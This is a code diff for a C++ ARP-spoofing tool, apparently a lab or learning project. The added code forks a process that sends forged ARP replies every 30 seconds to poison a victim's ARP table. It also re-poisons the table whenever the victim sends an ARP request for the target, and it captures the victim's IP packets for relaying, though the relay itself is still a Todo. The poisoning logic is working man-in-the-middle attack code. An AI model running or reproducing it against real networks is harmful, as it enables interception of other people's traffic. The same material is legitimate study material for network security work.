@@ -46,6 +46,7 @@ int main(int argc, char* argv[]) {
 		getMACAddress(handle, targetMac, targetIp, attackerMac, attackerIp);
 		cout << "Target MAC Address: " << string(targetMac) << "\n";
 
+		// Target continuously sends arp reply to sender (approx. per 90 seconds)
 		// Create Child Process to Continuously Infect ARP Table of Sender
 		pid_t pid = fork();
 		if (pid <0) {
@@ -54,9 +55,9 @@ int main(int argc, char* argv[]) {
 		}
 		else if (pid == 0) {
 			while(true) { 
-				cout << "Infecting ARP Table of Sender...\n";
+				cout << "Infecting Sender's ARP Table\n";
 				sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
-				sleep(5); //every 5 seconds
+				sleep(30); //30 secs will be enough, since target sends arp reply every 90 seconds
 			}
 		}
 		else {
@@ -72,12 +73,29 @@ int main(int argc, char* argv[]) {
 				}
 
 				EthHdr* ethHdr = (EthHdr*)packet;
-				printf("Packet Recieved!\n");
-				// Todo:
-				// 1. if packet is not from sender, continue
-				// 2. if packet is a arp request broadcast looking for target's mac, infect sender's arp table
-				// 3. if it is an ip packet from sender to target, relay the packet to target
+				
+				// Only check packets from sender
+				if (ethHdr->smac_ != senderMac) {
+					continue;
+				}
+				
+				// If an ARP Request form sender looking for target is recieved
+				// Infect Sender's ARP Table again
+				if (ethHdr->type() == EthHdr::Arp) {
+					ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
+					if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {
+						cout << "Recieved ARP Request. Infecting Sender's ARP Table...\n";
+						sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
+					}
+				} 
 
+				// If an IP Packet from sender to target is recieved
+				// Relay the packet to target
+				else if (ethHdr->type() == EthHdr::Ip4 ) {
+					cout << "IP Packet Recieved!\n";
+					// Todo:
+					// Packet Relay
+				}
 			}
 		}
 		//Todo: functional programming
